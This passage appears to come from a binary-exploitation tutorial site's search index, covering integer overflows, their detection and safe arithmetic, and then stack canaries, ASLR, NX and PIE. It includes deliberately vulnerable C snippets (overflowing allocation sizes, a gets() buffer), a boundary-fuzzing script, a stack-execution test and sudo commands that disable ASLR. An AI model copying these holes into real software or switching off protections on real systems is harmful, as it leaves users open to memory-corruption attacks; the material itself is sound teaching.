}\n\n    // Another thread can increment counter here\n\n    // Increment (non-atomic with validation)\n    current++;\n    atomic_store(&amp;shared_counter, current);\n\n    // Use incremented value for allocation\n    char *buffer = malloc(current * 1000);  // Can overflow\n    if (buffer) {\n        printf(\"Allocated buffer based on counter: %u\\\\n\", current);\n        free(buffer);\n    }\n}\n'''\n\n    print(\"Atomic operation bypass concept:\")\n    print(\"1. Read counter value atomically\")\n    print(\"2. Validate read value\")\n    print(\"3. Non-atomic increment creates race window\")\n    print(\"4. Other threads can modify counter between read and use\")\n\ntoctou_integer_overflow()\n</code></pre>"},{"location":"binary-exploitation/memory/03-integer-overflow/#cryptographic-integer-overflows","title":"Cryptographic Integer Overflows","text":"<pre><code>#!/usr/bin/env python3\n\ndef crypto_length_overflow():\n    \"\"\"Integer overflow in cryptographic operations\"\"\"\n\n    crypto_c = '''\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;openssl/aes.h&gt;\n\nvoid encrypt_data(unsigned char *plaintext, unsigned int plaintext_len) {\n    // Validate input length\n    if (plaintext_len &gt; 1000000) {\n        printf(\"Plaintext too long\\\\n\");\n        return;\n    }\n\n    // VULNERABLE: padding calculation can overflow\n    unsigned int padded_len = plaintext_len + 16;  // Add AES block size\n\n    if (padded_len &lt; plaintext_len) {\n        printf(\"Overflow detected\\\\n\");\n        return;\n    }\n\n    // Allocate buffer for padded plaintext\n    unsigned char *padded = malloc(padded_len);\n    if (!padded) return;\n\n    // Copy plaintext\n    memcpy(padded, plaintext, plaintext_len);\n\n    // Add padding\n    unsigned int padding_len = 16 - (plaintext_len % 16);\n    memset(padded + plaintext_len, padding_len, padding_len);\n\n    // Encrypt (simplified)\n    printf(\"Encrypting %u bytes\\\\n\", padded_len);\n\n    free(padded);\n}\n'''\n\n    print(\"Cryptographic integer overflow:\")\n    print(\"1. plaintext_len = 0xfffffff0\")\n    print(\"2. padded_len = plaintext_len + 16 = 0 (overflow)\")\n    print(\"3. malloc(0) allocates small buffer\")\n    print(\"4. memcpy writes large amount to small buffer\")\n\ndef hash_length_extension():\n    \"\"\"Hash length extension with integer overflow\"\"\"\n\n    hash_c = '''\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nvoid hash_with_secret(unsigned char *message, unsigned int msg_len, \n                     unsigned char *secret, unsigned int secret_len) {\n\n    // VULNERABLE: total_len can overflow\n    unsigned int total_len = msg_len + secret_len;\n\n    if (total_len &lt; msg_len || total_len &lt; secret_len) {\n        printf(\"Length overflow detected\\\\n\");\n        return;\n    }\n\n    // Allocate combined buffer\n    unsigned char *combined = malloc(total_len);\n    if (!combined) return;\n\n    // Combine message and secret\n    memcpy(combined, message, msg_len);\n    memcpy(combined + msg_len, secret, secret_len);\n\n    // Hash the combined data\n    printf(\"Hashing %u bytes\\\\n\", total_len);\n\n    free(combined);\n}\n'''\n\n    print(\"Hash length extension overflow:\")\n    print(\"1. Attacker controls message length\")\n    print(\"2. msg_len + secret_len overflows\")\n    print(\"3. Small buffer allocated\")\n    print(\"4. Secret copied beyond buffer bounds\")\n\ncrypto_length_overflow()\n</code></pre>"},{"location":"binary-exploitation/memory/03-integer-overflow/#detection-and-analysis","title":"Detection and Analysis","text":""},{"location":"binary-exploitation/memory/03-integer-overflow/#static-analysis-for-integer-overflows","title":"Static Analysis for Integer Overflows","text":"<pre><code>#!/usr/bin/env python3\nimport re\n\ndef analyze_integer_overflows(code):\n    \"\"\"Static analysis for potential integer overflow vulnerabilities\"\"\"\n\n    issues = []\n    lines = code.split('\\n')\n\n    for i, line in enumerate(lines, 1):\n        # Look for arithmetic operations with user input\n        if re.search(r'(\\w+)\\s*(\\+|\\*)\\s*(\\w+)', line):\n            # Check if result is used in memory operations\n            if any(func in line for func in ['malloc', 'calloc', 'realloc', 'alloca']):\n                issues.append(f\"Line {i}: Potential overflow in memory allocation: {line.strip()}\")\n\n            if any(func in line for func in ['memcpy', 'memset', 'memmove']):\n                issues.append(f\"Line {i}: Potential overflow in memory operation: {line.strip()}\")\n\n        # Look for size calculations\n        if re.search(r'size\\s*=.*\\*', line) or re.search(r'count\\s*\\*\\s*sizeof', line):\n            issues.append(f\"Line {i}: Size calculation may overflow: {line.strip()}\")\n\n        # Look for array indexing with calculations\n        if re.search(r'\\[.*\\+.*\\]', line):\n            issues.append(f\"Line {i}: Array index calculation may overflow: {line.strip()}\")\n\n        # Look for loops with user-controlled bounds\n        if re.search(r'for.*&lt;.*atoi', line) or re.search(r'while.*&lt;.*user', line):\n            issues.append(f\"Line {i}: Loop bound from user input: {line.strip()}\")\n\n    return issues\n\ndef check_type_mixing(code):\n    \"\"\"Check for dangerous type mixing that can lead to overflows\"\"\"\n\n    issues = []\n    lines = code.split('\\n')\n\n    for i, line in enumerate(lines, 1):\n        # Look for signed/unsigned mixing\n        if re.search(r'unsigned.*=.*atoi', line):\n            issues.append(f\"Line {i}: Signed to unsigned conversion: {line.strip()}\")\n\n        if re.search(r'size_t.*=.*int', line) and 'unsigned' not in line:\n            issues.append(f\"Line {i}: Signed int to size_t conversion: {line.strip()}\")\n\n        # Look for casting without validation\n        if re.search(r'\\(.*int\\)', line) and any(func in line for func in ['malloc', 'sizeof']):\n            issues.append(f\"Line {i}: Unchecked type cast: {line.strip()}\")\n\n    return issues\n\n# Example usage\nvulnerable_code = '''\nvoid process_data(int count, int size) {\n    unsigned int total = count * size;  // Overflow risk\n    char *buffer = malloc(total);       // Small allocation if overflow\n\n    for (int i = 0; i &lt; count; i++) {   // Loop uses original values\n        memset(buffer + i * size, 'A', size);  // Buffer overflow\n    }\n}\n\nvoid copy_string(char *src) {\n    int len = strlen(src);\n    char *dest = malloc(len + 1);       // len + 1 can overflow\n    strcpy(dest, src);\n}\n'''\n\noverflow_issues = analyze_integer_overflows(vulnerable_code)\ntype_issues = check_type_mixing(vulnerable_code)\n\nprint(\"Integer overflow issues:\")\nfor issue in overflow_issues:\n    print(f\"  {issue}\")\n\nprint(\"\\nType mixing issues:\")\nfor issue in type_issues:\n    print(f\"  {issue}\")\n</code></pre>"},{"location":"binary-exploitation/memory/03-integer-overflow/#dynamic-detection-with-sanitizers","title":"Dynamic Detection with Sanitizers","text":"<pre><code># Compile with integer overflow detection\ngcc -fsanitize=signed-integer-overflow -fsanitize=unsigned-integer-overflow \\\n    -g -o overflow_test program.c\n\n# Run with overflow detection\n./overflow_test\n\n# Enable additional checks\nexport UBSAN_OPTIONS=\"print_stacktrace=1:halt_on_error=1\"\n./overflow_test\n</code></pre>"},{"location":"binary-exploitation/memory/03-integer-overflow/#runtime-testing","title":"Runtime Testing","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\nimport struct\n\ndef test_integer_boundaries(binary_path):\n    \"\"\"Test various integer boundary conditions\"\"\"\n\n    test_cases = [\n        # Unsigned integer boundaries\n        (\"0\", \"Zero\"),\n        (\"1\", \"One\"),\n        (\"4294967295\", \"UINT_MAX (32-bit)\"),\n        (\"4294967296\", \"UINT_MAX + 1\"),\n        (\"18446744073709551615\", \"ULLONG_MAX (64-bit)\"),\n\n        # Signed integer boundaries\n        (\"2147483647\", \"INT_MAX (32-bit)\"),\n        (\"2147483648\", \"INT_MAX + 1\"),\n        (\"-2147483648\", \"INT_MIN (32-bit)\"),\n        (\"-2147483649\", \"INT_MIN - 1\"),\n\n        # Overflow-inducing pairs\n        (\"4294967295\", \"UINT_MAX for size calculations\"),\n        (\"65536\", \"Large value for width/height\"),\n        (\"0xffffffff\", \"Hex UINT_MAX\"),\n    ]\n\n    results = []\n\n    for test_input, description in test_cases:\n        try:\n            p = process([binary_path, test_input])\n            output = p.recvall(timeout=2)\n\n            result = {\n                'input': test_input,\n                'description': description,\n                'output': output,\n                'crashed': p.returncode != 0,\n                'returncode': p.returncode\n            }\n\n            results.append(result)\n            p.close()\n\n        except Exception as e:\n            results.append({\n                'input': test_input,\n                'description': description,\n                'error': str(e),\n                'crashed': True\n            })\n\n    return results\n\ndef fuzz_arithmetic_operations():\n    \"\"\"Fuzz arithmetic operations for overflows\"\"\"\n\n    import random\n\n    # Generate test values around boundaries\n    test_values = [\n        # Near 32-bit boundaries\n        0xfffffffe, 0xffffffff, 0x80000000, 0x7fffffff,\n        # Near 16-bit boundaries  \n        0xfffe, 0xffff, 0x8000, 0x7fff,\n        # Powers of 2\n        2**8, 2**16, 2**24, 2**32,\n        # Random large values\n        random.randint(0xf0000000, 0xffffffff) for _ in range(10)\n    ]\n\n    overflow_cases = []\n\n    for val1 in test_values[:10]:  # Limit combinations\n        for val2 in test_values[:10]:\n            # Test addition overflow\n            add_result = (val1 + val2) &amp; 0xffffffff\n            if add_result &lt; val1 or add_result &lt; val2:\n                overflow_cases.append(('add', val1, val2, add_result))\n\n            # Test multiplication overflow\n            mul_result = (val1 * val2) &amp; 0xffffffff\n            if val2 != 0 and mul_result // val2 != val1:\n                overflow_cases.append(('mul', val1, val2, mul_result))\n\n    print(f\"Found {len(overflow_cases)} overflow cases\")\n    for op, val1, val2, result in overflow_cases[:5]:\n        print(f\"{op}: 0x{val1:x} {op} 0x{val2:x} = 0x{result:x}\")\n\n    return overflow_cases\n\n# Example usage\n# results = test_integer_boundaries('./vuln_overflow')\n# overflow_cases = fuzz_arithmetic_operations()\n</code></pre>"},{"location":"binary-exploitation/memory/03-integer-overflow/#mitigation-and-prevention","title":"Mitigation and Prevention","text":""},{"location":"binary-exploitation/memory/03-integer-overflow/#safe-integer-arithmetic","title":"Safe Integer Arithmetic","text":"<pre><code>// safe_arithmetic.c - Safe integer operations\n\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;stdbool.h&gt;\n#include &lt;limits.h&gt;\n\n// Safe addition\nbool safe_add_uint(unsigned int a, unsigned int b, unsigned int *result) {\n    if (a &gt; UINT_MAX - b) {\n        return false;  // Overflow would occur\n    }\n\n    *result = a + b;\n    return true;\n}\n\nbool safe_add_int(int a, int b, int *result) {\n    if (b &gt; 0 &amp;&amp; a &gt; INT_MAX - b) {\n        return false;  // Positive overflow\n    }\n\n    if (b &lt; 0 &amp;&amp; a &lt; INT_MIN - b) {\n        return false;  // Negative overflow\n    }\n\n    *result = a + b;\n    return true;\n}\n\n// Safe multiplication\nbool safe_mul_uint(unsigned int a, unsigned int b, unsigned int *result) {\n    if (a != 0 &amp;&amp; b &gt; UINT_MAX / a) {\n        return false;  // Overflow would occur\n    }\n\n    *result = a * b;\n    return true;\n}\n\nbool safe_mul_size_t(size_t a, size_t b, size_t *result) {\n    if (a != 0 &amp;&amp; b &gt; SIZE_MAX / a) {\n        return false;  // Overflow would occur\n    }\n\n    *result = a * b;\n    return true;\n}\n\n// Safe array allocation\nvoid* safe_array_alloc(size_t count, size_t element_size) {\n    size_t total_size;\n\n    if (!safe_mul_size_t(count, element_size, &amp;total_size)) {\n        printf(\"Array allocation would overflow\\n\");\n        return NULL;\n    }\n\n    return malloc(total_size);\n}\n\n// Safe buffer operations\nbool safe_buffer_copy(void *dest, size_t dest_size, \n                     const void *src, size_t src_size) {\n    if (src_size &gt; dest_size) {\n        printf(\"Source too large for destination\\n\");\n        return false;\n    }\n\n    memcpy(dest, src, src_size);\n    return true;\n}\n\n// Example usage\nint main() {\n    unsigned int a = 0xffffffff;\n    unsigned int b = 2;\n    unsigned int result;\n\n    if (safe_add_uint(a, b, &amp;result)) {\n        printf(\"Addition result: %u\\n\", result);\n    } else {\n        printf(\"Addition would overflow\\n\");\n    }\n\n    // Safe array allocation\n    size_t count = 1000000;\n    size_t element_size = sizeof(int);\n\n    int *array = safe_array_alloc(count, element_size);\n    if (array) {\n        printf(\"Array allocated successfully\\n\");\n        free(array);\n    } else {\n        printf(\"Array allocation failed or would overflow\\n\");\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"binary-exploitation/memory/03-integer-overflow/#compiler-based-protections","title":"Compiler-Based Protections","text":"<pre><code># Enable integer overflow detection\ngcc -fsanitize=signed-integer-overflow \\\n    -fsanitize=unsigned-integer-overflow \\\n    -ftrapv \\\n    -o protected_program program.c\n\n# Enable all warnings\ngcc -Wall -Wextra -Wconversion -Wsign-conversion \\\n    -Woverflow -o warned_program program.c\n\n# Use safe alternatives\n# Consider using languages with built-in overflow protection\n</code></pre>"},{"location":"binary-exploitation/memory/03-integer-overflow/#language-level-solutions","title":"Language-Level Solutions","text":"<pre><code>// Rust example with built-in overflow protection\nfn safe_arithmetic_rust() {\n    let a: u32 = u32::MAX;\n    let b: u32 = 1;\n\n    // This will panic in debug mode, wrap in release mode\n    // let result = a + b;\n\n    // Safe operations\n    match a.checked_add(b) {\n        Some(result) =&gt; println!(\"Result: {}\", result),\n        None =&gt; println!(\"Overflow detected\"),\n    }\n\n    // Saturating arithmetic\n    let saturated = a.saturating_add(b);\n    println!(\"Saturated result: {}\", saturated);\n\n    // Wrapping arithmetic (explicit)\n    let wrapped = a.wrapping_add(b);\n    println!(\"Wrapped result: {}\", wrapped);\n}\n</code></pre>"},{"location":"binary-exploitation/memory/03-integer-overflow/#key-takeaways","title":"Key Takeaways","text":"<p>Integer Overflow Fundamentals</p> <ul> <li>Arithmetic can exceed type limits - Addition and multiplication are common sources</li> <li>Wraparound behavior varies - Signed vs unsigned have different overflow behavior  </li> <li>Memory operations are vulnerable - malloc, memcpy, array indexing affected</li> <li>Validation can be bypassed - Overflow can make large values appear small</li> <li>Combined with other bugs - Often enables exploitation of other vulnerabilities</li> </ul> <p>Common Mistakes</p> <ul> <li>Not checking for overflow in size calculations</li> <li>Mixing signed and unsigned types without validation</li> <li>Assuming larger types prevent overflow</li> <li>Only checking upper bounds in validation</li> <li>Using user input directly in arithmetic operations</li> </ul> <p>Prevention Strategies</p> <ul> <li>Use safe arithmetic functions that check for overflow</li> <li>Validate inputs before arithmetic operations</li> <li>Use appropriate data types for the expected value range</li> <li>Enable compiler warnings and sanitizers during development</li> <li>Consider using languages with built-in overflow protection</li> </ul> <p>Next: Understanding Mitigations</p>"},{"location":"binary-exploitation/protection/01-mitigations/","title":"Understanding Mitigations","text":"<p>Modern operating systems and compilers implement various security mitigations to make exploitation more difficult. Understanding these protections is crucial for both defensive and offensive security. This chapter covers the most common mitigations and their fundamental principles.</p>"},{"location":"binary-exploitation/protection/01-mitigations/#overview-of-security-mitigations","title":"Overview of Security Mitigations","text":""},{"location":"binary-exploitation/protection/01-mitigations/#the-evolution-of-protections","title":"The Evolution of Protections","text":"<pre><code>Timeline of Security Mitigations:\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 1990s: Basic Stack  \u2502 \u2190 Early stack protection attempts\n\u2502 Protection          \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 2000s: NX/DEP       \u2502 \u2190 Non-executable memory\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 2001: Stack Canaries\u2502 \u2190 GCC stack protection\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 2005: ASLR          \u2502 \u2190 Address Space Layout Randomization\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 2010s: Enhanced     \u2502 \u2190 SMEP, SMAP, CET\n\u2502 Hardware Features   \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 2020s: Modern       \u2502 \u2190 CET, PAC, BTI\n\u2502 Hardware Mitigations\u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"binary-exploitation/protection/01-mitigations/#categories-of-mitigations","title":"Categories of Mitigations","text":"<ol> <li>Preventive - Stop exploitation attempts</li> <li>Detective - Detect exploitation attempts</li> <li>Mitigative - Reduce impact of successful exploitation</li> </ol>"},{"location":"binary-exploitation/protection/01-mitigations/#stack-protection-mechanisms","title":"Stack Protection Mechanisms","text":""},{"location":"binary-exploitation/protection/01-mitigations/#stack-canaries-stack-guards","title":"Stack Canaries (Stack Guards)","text":"<p>Stack canaries are values placed between local variables and the return address to detect buffer overflows.</p> <pre><code>// How stack canaries work\nvoid function_with_canary() {\n    // Compiler inserts canary value\n    unsigned long canary = get_random_canary();\n\n    char buffer[100];  // Local variables\n\n    // User code here...\n\n    // Before return, compiler checks canary\n    if (canary != get_original_canary()) {\n        abort();  // Stack smashing detected\n    }\n\n    return;  // Safe to return\n}\n</code></pre>"},{"location":"binary-exploitation/protection/01-mitigations/#types-of-stack-canaries","title":"Types of Stack Canaries","text":"<pre><code>// 1. Terminator canaries (null, newline, EOF, -1)\nunsigned int terminator_canary = 0x000aff0d;\n\n// 2. Random canaries  \nunsigned long random_canary = random_value();\n\n// 3. Random XOR canaries\nunsigned long xor_canary = random_value() ^ return_address;\n</code></pre>"},{"location":"binary-exploitation/protection/01-mitigations/#stack-layout-with-canaries","title":"Stack Layout with Canaries","text":"<pre><code>Stack Layout:\nHigh Address\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502   Function Args     \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502   Return Address    \u2502 \u2190 Protected by canary\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502   Saved Frame Ptr   \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502   Stack Canary      \u2502 \u2190 Detection mechanism\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502   Local Variables   \u2502\n\u2502   (buffer)          \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\nLow Address\n</code></pre>"},{"location":"binary-exploitation/protection/01-mitigations/#analyzing-stack-canaries","title":"Analyzing Stack Canaries","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ndef analyze_canary_protection():\n    \"\"\"Analyze how stack canaries work\"\"\"\n\n    # Compile test program with different canary settings\n    test_c = '''\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nvoid vulnerable_function() {\n    char buffer[64];\n    printf(\"Enter input: \");\n    gets(buffer);\n    printf(\"Input: %s\\\\n\", buffer);\n}\n\nint main() {\n    vulnerable_function();\n    return 0;\n}\n'''\n\n    print(\"Stack canary analysis:\")\n    print(\"1. Compile without canaries: gcc -fno-stack-protector\")\n    print(\"2. Compile with canaries: gcc -fstack-protector-all\")\n    print(\"3. Try buffer overflow and observe behavior\")\n\ndef detect_canary_implementation():\n    \"\"\"Detect canary implementation details\"\"\"\n\n    canary_test_c = '''\n#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n\nvoid show_canary_location() {\n    char buffer[64];\n    unsigned long canary;\n\n    // This is implementation-specific\n    // Canary is typically at %fs:0x28 on x86_64\n    asm(\"mov %%fs:0x28, %0\" : \"=r\" (canary));\n\n    printf(\"Buffer address: %p\\\\n\", buffer);\n    printf(\"Canary value: 0x%016lx\\\\n\", canary);\n    printf(\"Canary location: %%fs:0x28\\\\n\");\n}\n\nint main() {\n    show_canary_location();\n    return 0;\n}\n'''\n\n    print(\"Canary implementation details:\")\n    print(\"- x86_64: Stored at %fs:0x28\")\n    print(\"- ARM64: Stored in special register\")\n    print(\"- Initialized at process startup\")\n\nanalyze_canary_protection()\n</code></pre>"},{"location":"binary-exploitation/protection/01-mitigations/#address-space-layout-randomization-aslr","title":"Address Space Layout Randomization (ASLR)","text":""},{"location":"binary-exploitation/protection/01-mitigations/#aslr-concepts","title":"ASLR Concepts","text":"<p>ASLR randomizes the memory layout of processes to make exploitation unpredictable.</p> <pre><code>Memory Layout with ASLR:\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Stack               \u2502 \u2190 Randomized base address\n\u2502 0x7fff????0000     \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 Libraries (libc)    \u2502 \u2190 Randomized load addresses\n\u2502 0x7f??????0000     \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 Heap                \u2502 \u2190 Randomized heap base\n\u2502 0x????00000000     \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 Program Binary      \u2502 \u2190 May be randomized (PIE)\n\u2502 0x400000 or random  \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"binary-exploitation/protection/01-mitigations/#aslr-levels","title":"ASLR Levels","text":"<pre><code># Check ASLR status on Linux\ncat /proc/sys/kernel/randomize_va_space\n# 0 = Disabled\n# 1 = Conservative (stack, libraries, heap)\n# 2 = Full (includes program binary with PIE)\n\n# Disable ASLR for testing\necho 0 | sudo tee /proc/sys/kernel/randomize_va_space\n\n# Enable full ASLR\necho 2 | sudo tee /proc/sys/kernel/randomize_va_space\n</code></pre>"},{"location":"binary-exploitation/protection/01-mitigations/#testing-aslr-effectiveness","title":"Testing ASLR Effectiveness","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\nimport subprocess\n\ndef test_aslr_randomization():\n    \"\"\"Test ASLR randomization effectiveness\"\"\"\n\n    test_program = '''\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main() {\n    char stack_var;\n    char *heap_var = malloc(10);\n\n    printf(\"Stack: %p\\\\n\", &amp;stack_var);\n    printf(\"Heap: %p\\\\n\", heap_var);\n    printf(\"Main: %p\\\\n\", main);\n    printf(\"Libc: %p\\\\n\", printf);\n\n    free(heap_var);\n    return 0;\n}\n'''\n\n    print(\"ASLR randomization test:\")\n    print(\"Run the same program multiple times and observe address changes\")\n\n    # Collect addresses from multiple runs\n    addresses = {'stack': [], 'heap': [], 'main': [], 'libc': []}\n\n    for i in range(5):\n        try:\n            result = subprocess.run(['./aslr_test'], \n                                  capture_output=True, text=True, timeout=2)\n\n            lines = result.stdout.split('\\n')\n            for line in lines:\n                if 'Stack:' in line:\n                    addr = line.split()[1]\n                    addresses['stack'].append(addr)\n                elif 'Heap:' in line:\n                    addr = line.split()[1]\n                    addresses['heap'].append(addr)\n                elif 'Main:' in line:\n                    addr = line.split()[1]\n                    addresses['main'].append(addr)\n                elif 'Libc:' in line:\n                    addr = line.split()[1]\n                    addresses['libc'].append(addr)\n        except:\n            continue\n\n    # Analyze randomization\n    for category, addrs in addresses.items():\n        unique_addrs = len(set(addrs))\n        print(f\"{category}: {unique_addrs}/{len(addrs)} unique addresses\")\n\ndef calculate_aslr_entropy():\n    \"\"\"Calculate ASLR entropy\"\"\"\n\n    entropy_info = {\n        'stack': 23,      # bits of randomization\n        'heap': 12,       # typical heap randomization\n        'libraries': 28,  # library load addresses\n        'pie': 28,        # PIE randomization\n    }\n\n    print(\"Typical ASLR entropy (bits):\")\n    for component, bits in entropy_info.items():\n        possibilities = 2 ** bits\n        print(f\"{component}: {bits} bits ({possibilities:,} possibilities)\")\n\ntest_aslr_randomization()\n</code></pre>"},{"location":"binary-exploitation/protection/01-mitigations/#data-execution-prevention-depnx","title":"Data Execution Prevention (DEP/NX)","text":""},{"location":"binary-exploitation/protection/01-mitigations/#non-executable-memory","title":"Non-Executable Memory","text":"<p>DEP/NX prevents execution of code in data segments.</p> <pre><code>Memory Permissions:\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Segment             \u2502  R  \u2502  W  \u2502  X  \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 Code (.text)        \u2502  \u2713  \u2502  \u2717  \u2502  \u2713  \u2502\n\u2502 Data (.data)        \u2502  \u2713  \u2502  \u2713  \u2502  \u2717  \u2502\n\u2502 BSS                 \u2502  \u2713  \u2502  \u2713  \u2502  \u2717  \u2502\n\u2502 Stack               \u2502  \u2713  \u2502  \u2713  \u2502  \u2717  \u2502 \u2190 NX prevents shellcode\n\u2502 Heap                \u2502  \u2713  \u2502  \u2713  \u2502  \u2717  \u2502 \u2190 NX prevents shellcode\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"binary-exploitation/protection/01-mitigations/#hardware-support","title":"Hardware Support","text":"<pre><code>#!/usr/bin/env python3\n\ndef check_nx_support():\n    \"\"\"Check NX/DEP hardware support\"\"\"\n\n    # Check CPU features\n    import subprocess\n\n    try:\n        # Check for NX bit support\n        result = subprocess.run(['cat', '/proc/cpuinfo'], \n                              capture_output=True, text=True)\n\n        if 'nx' in result.stdout:\n            print(\"\u2713 NX bit supported by CPU\")\n        else:\n            print(\"\u2717 NX bit not supported\")\n\n        # Check current process memory mappings\n        with open('/proc/self/maps', 'r') as f:\n            maps = f.read()\n\n        print(\"\\nMemory mappings for current process:\")\n        for line in maps.split('\\n')[:10]:  # First 10 lines\n            if line:\n                parts = line.split()\n                if len(parts) &gt;= 2:\n                    address = parts[0]\n                    perms = parts[1]\n                    print(f\"{address}: {perms}\")\n\n    except:\n        print(\"Could not check NX support\")\n\ndef test_executable_stack():\n    \"\"\"Test if stack is executable\"\"\"\n\n    test_c = '''\n#include &lt;stdio.h&gt;\n#include &lt;sys/mman.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;string.h&gt;\n\n// Shellcode: just returns\nunsigned char shellcode[] = \"\\\\xc3\";  // ret instruction\n\nint main() {\n    printf(\"Testing stack execution...\\\\n\");\n\n    // Try to execute code on stack\n    char stack_code[16];\n    memcpy(stack_code, shellcode, sizeof(shellcode));\n\n    printf(\"Attempting to execute stack code...\\\\n\");\n\n    // This should fail with NX enabled\n    ((void(*)())stack_code)();\n\n    printf(\"Stack execution succeeded (NX disabled)\\\\n\");\n    return 0;\n}\n'''\n\n    print(\"Stack execution test:\")\n    print(\"Compile with: gcc -z execstack (allows stack execution)\")\n    print(\"Compile with: gcc -z noexecstack (prevents stack execution)\")\n\ncheck_nx_support()\n</code></pre>"},{"location":"binary-exploitation/protection/01-mitigations/#position-independent-executable-pie","title":"Position Independent Executable (PIE)","text":""},{"location":"binary-exploitation/protection/01-mitigations/#pie-concepts","title":"PIE Concepts","text":"<p>PIE extends ASLR to randomize the program binary's load address.</p> <pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ndef analyze_pie_protection():\n    \"\"\"Analyze PIE protection\"\"\"\n\n    # Non-PIE binary\n    non_pie_c = '''\n#include &lt;stdio.h&gt;\n\nint main() {\n    printf(\"main() at: %p\\\\n\", main);\n    return 0;\n}\n'''\n\n    # PIE binary  \n    pie_c = '''\n#include &lt;stdio.h&gt;\n\nint main() {\n    printf(\"main() at: %p\\\\n\", main);\n    return 0;\n}\n'''\n\n    print(\"PIE analysis:\")\n    print(\"Non-PIE: gcc -no-pie -o non_pie program.c\")\n    print(\"  - main() always at same address (e.g., 0x401234)\")\n    print(\"PIE: gcc -fPIE -pie -o pie_binary program.c\")\n    print(\"  - main() at random address each run\")\n\ndef 